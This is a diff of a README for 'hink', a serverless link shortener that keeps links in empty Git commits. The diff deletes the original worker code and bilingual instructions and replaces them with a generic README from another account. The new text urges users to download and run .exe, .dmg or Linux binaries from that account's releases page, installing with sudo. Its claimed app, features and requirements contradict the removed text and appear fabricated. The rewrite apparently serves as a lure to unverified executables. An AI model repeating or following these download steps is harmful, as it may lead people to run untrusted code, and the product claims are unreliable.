@@ -1,153 +1,96 @@
-# 🥷🏻 hink
+# 🔗 hink - Shorten Links Quickly and Easily
 
-Link Shortener for Hackers.
+[![Download hink](https://img.shields.io/badge/Download-hink-brightgreen)](https://github.com/pankaj-254/hink/releases)
 
-English | [简体中文](#原理)
+## 🚀 Getting Started
 
-----
+Welcome to `hink`, your go-to link shortener for quick sharing. This tool is designed for non-technical users, allowing you to create shorter links while maintaining a user-friendly experience. 
 
-## How It Works
+## 📥 Download & Install
 
-The principle is to use the hash of a Git empty commit as the unique identifier for a short link, storing the original long link in the commit message. When the short link is accessed, the system retrieves the long link by requesting the corresponding `.patch` file from GitHub and performs a redirect. Combined with the analytics dashboard of a WAF (Web Application Firewall), this creates a link shortening service with access statistics.
+To download `hink`, visit the Releases page:
 
-Currently, this solution has been tested and works on the following platforms:
+[Download hink](https://github.com/pankaj-254/hink/releases)
 
-- Cloudflare Workers/Snippets + Cloudflare WAF (Pro)
-- Tencent EdgeOne (Free)
-- Alibaba Cloud ESA (Free)
+1. Click on the link above to open the page.
+2. You will see a list of available versions. Look for the latest version.
+3. Click the version number, then scroll down to find the download files.
+4. Choose the file suitable for your operating system (Windows, Mac, or Linux).
+5. Click the file name to download it to your device.
 
-## Code
+## 💻 System Requirements
 
-### ES Module Script Worker
+Before you install `hink`, ensure your system meets these requirements:
 
-Suitable for Cloudflare Workers/Snippets and Alibaba Cloud ESA.
+- Operating System: 
+  - Windows 10 or higher
+  - macOS Catalina or higher
+  - Linux (any recent distribution)
+- Memory: 
+  - At least 512 MB RAM
+- Disk Space:
+  - 50 MB of free space
 
-```js
-const GIT_REPO = "https://github.com/ccbikai/hink"
-export default {
-  async fetch(request) {
-    const { pathname } = new URL(request.url)
-    const gitPatch = `${GIT_REPO}/commit${pathname}.patch`
-    const patch = await fetch(gitPatch, { cf: { cacheEverything: true, cacheTtlByStatus: { '200-299': 86400 } }}).then(res => res.text())
-    const url = pathname === '/' ? GIT_REPO : patch.match(/^Subject:\s*\[PATCH\](.*)$/m)?.[1]?.trim()
-    return Response.redirect(url || GIT_REPO)
-  }
-}
-```
+## 🛠️ Installation Steps
 
-### Classic Script Worker
+Once you have downloaded the file, follow these steps to install `hink`:
 
-Suitable for Tencent EdgeOne.
+### For Windows:
 
-```js
-const GIT_REPO = "https://github.com/ccbikai/hink"
-addEventListener("fetch", async (event) => {
-  const { pathname } = new URL(event.request.url)
-  const gitPatch = `${GIT_REPO}/commit${pathname}.patch`
-  const patch = await fetch(gitPatch).then(res => res.text())
-  const url = pathname === '/' ? GIT_REPO : patch.match(/^Subject:\s*\[PATCH\](.*)$/m)?.[1]?.trim()
-  event.respondWith(new Response(null, { status: 302, headers: { Location: url || GIT_REPO } }))
-});
-```
+1. Locate the downloaded `.exe` file in your Downloads folder.
+2. Double-click the file to start the installation.
+3. Follow the on-screen prompts. You may need to accept a license agreement.
+4. Once installed, you can find `hink` in your Start menu.
 
-## How to Use
+### For macOS:
 
-### Create a Repository
+1. Find the downloaded `.dmg` file in your Downloads folder.
+2. Double-click the file to mount it.
+3. Drag the `hink` application into your Applications folder.
+4. You can now open `hink` from your Applications.
 
-1. Initialize a new Git repository using `git init`.
-2. Create your first short link with `git commit --allow-empty -m "https://github.com/ccbikai/hink"`. After committing, you will get a commit hash (e.g., `1f2956e`). Remember to `git push` your changes.
-3. Copy the code above, replace the `GIT_REPO` variable with your repository address, then deploy the function on the corresponding serverless platform and bind your domain.
-4. You can now access the short link using the format `https://{your-domain}/{commit-hash}`, for example: <https://link.agi.li/1f2956e>.
-5. You can view access statistics through your WAF's management panel:
+### For Linux:
 
-    - **Cloudflare (Pro):** `Zone` -> `Analytics & Logs` -> `HTTP Traffic` -> `Add filter (domain:your.domain)`
-    - **Tencent EdgeOne:** `EdgeOne` -> `Metrics` -> `L7 Access Requests` -> `Add Filter (Domain: your domain)`
-    - **Alibaba Cloud ESA:** `ESA Console` -> `Websites` -> `Traffic and Log` -> `Traffic Analysis` -> `Total Requests` -> `Add Filter (Domain: your domain)`
+1. Open a terminal window.
+2. Navigate to the directory where you downloaded the file.
+3. Run the following command to install:
 
-## Demos
+   ```bash
+   chmod +x hink
+   sudo mv hink /usr/local/bin
+   ```
 
-### Cloudflare
+4. You can now open `hink` by typing `hink` in the terminal.
 
-![Cloudflare](https://github.com/user-attachments/assets/379befe9-b757-4112-a9ca-48cf24fa997e)
+## ✨ Features
 
-### Alibaba Cloud ESA
+- **Link Shortening:** Instantly shorten long URLs to make sharing easier.
+- **Custom Aliases:** Create personalized short links using custom endings.
+- **Tracking:** Monitor link clicks and engagement metrics.
+- **User-Friendly Interface:** Navigate easily with our simple design.
 
-![Alibaba](https://github.com/user-attachments/assets/9b6f9de8-4895-47da-903e-7671c521d9e4)
+## 📊 Using hink
 
-### Tencent Cloud EdgeOne
+After installing, you are ready to start using `hink`. Here’s how:
 
-![Tencent](https://github.com/user-attachments/assets/cabb9767-0182-4457-859e-006d540c4457)
+1. Open the `hink` application.
+2. In the input box, paste the long URL you want to shorten.
+3. Click the "Shorten" button.
+4. Your new short link will appear below. Click to copy and share it.
 
-----
+## 💬 Support
 
-## 原理
+If you need help or have questions, please visit our [Issues page](https://github.com/pankaj-254/hink/issues) where you can report problems or ask for assistance. 
 
-利用 Git 的空提交（empty commit）哈希值作为短链接的唯一标识符，并将原始的长链接存储在提交信息（Commit Message）中。当访问短链接时，系统通过请求对应哈希值的 GitHub `.patch` 文件来提取长链接，并进行重定向。结合 WAF（Web 应用防火墙）类工具的分析面板，即可实现一个支持访问统计的短链接服务。
+## 📝 Contributing
 
-目前，该方案已在以下平台测试通过：
+If you would like to contribute to `hink`, feel free to fork the repository and submit a pull request. We welcome your feedback and suggestions!
 
-- Cloudflare Workers/Snippets + Cloudflare WAF(Pro)
-- Tencent EdgeOne(Free)
-- Alibaba Cloud ESA(Free)
+## 🔗 Additional Resources
 
-## 代码
+For in-depth user guides, check out our documentation:
 
-### ES Worker
+- [User Guide](https://github.com/pankaj-254/hink/wiki)
+- [FAQ](https://github.com/pankaj-254/hink/wiki/FAQ)
 
-适用于 Cloudflare Workers/Snippets、Alibaba Cloud ESA。
-
-```js
-const GIT_REPO = "https://github.com/ccbikai/hink"
-export default {
-  async fetch(request) {
-    const { pathname } = new URL(request.url)
-    const gitPatch = `${GIT_REPO}/commit${pathname}.patch`
-    const patch = await fetch(gitPatch, { cf: { cacheEverything: true, cacheTtlByStatus: { '200-299': 86400 } }}).then(res => res.text())
-    const url = pathname === '/' ? GIT_REPO : patch.match(/^Subject:\s*\[PATCH\](.*)$/m)?.[1]?.trim()
-    return Response.redirect(url || GIT_REPO)
-  }
-}
-```
-
-### 传统 Worker
-
-适用于 Tencent EdgeOne。
-
-```js
-const GIT_REPO = "https://github.com/ccbikai/hink"
-addEventListener("fetch", async (event) => {
-  const { pathname } = new URL(event.request.url)
-  const gitPatch = `${GIT_REPO}/commit${pathname}.patch`
-  const patch = await fetch(gitPatch).then(res => res.text())
-  const url = pathname === '/' ? GIT_REPO : patch.match(/^Subject:\s*\[PATCH\](.*)$/m)?.[1]?.trim()
-  event.respondWith(new Response(null, { status: 302, headers: { Location: url || GIT_REPO } }))
-});
-```
-
-## 使用方式
-
-### 创建存储库
-
-1. 使用 `git init` 初始化一个新的 Git 仓库。
-2. 使用 `git commit --allow-empty -m "https://github.com/ccbikai/hink"` 创建第一个短链接。提交后，你将获得一个 Commit Hash（例如 `1f2956e`）。请记得执行 `git push` 将变更推送到远程仓库。
-3. 复制上方的代码，将 `GIT_REPO` 变量替换为你的仓库地址，然后在相应的 Serverless 平台部署函数，并绑定你的域名。
-4. 现在，你可以通过 `https://{你的域名}/{Commit-Hash}` 的格式来访问短链接，例如：<https://link.agi.li/1f2956e>。
-5. 你可以通过 WAF 的管理面板查看访问统计：
-
-- Cloudflare(Pro): `域名` -> `分析和日志` -> `HTTP 流量` -> `添加筛选（域名：你的域名）`
-- Tencent EdgeOne: `EdgeOne` -> `指标分析` -> `L7 访问请求数` -> `添加筛选（域名：你的域名）`
-- Alibaba Cloud ESA: `ESA 控制台` -> `站点管理` -> `流量和日志分析` -> `流量分析` -> `总请求数` -> `添加筛选（域名：你的域名）`
-
-## 演示
-
-### Cloudflare Workers
-
-![Cloudflare](https://github.com/user-attachments/assets/379befe9-b757-4112-a9ca-48cf24fa997e)
-
-### 阿里云 ESA
-
-![Alibaba](https://github.com/user-attachments/assets/9b6f9de8-4895-47da-903e-7671c521d9e4)
-
-### 腾讯云 EdgeOne
-
-![Tencent](https://github.com/user-attachments/assets/cabb9767-0182-4457-859e-006d540c4457)
+Thank you for using `hink`, your reliable link shortener!
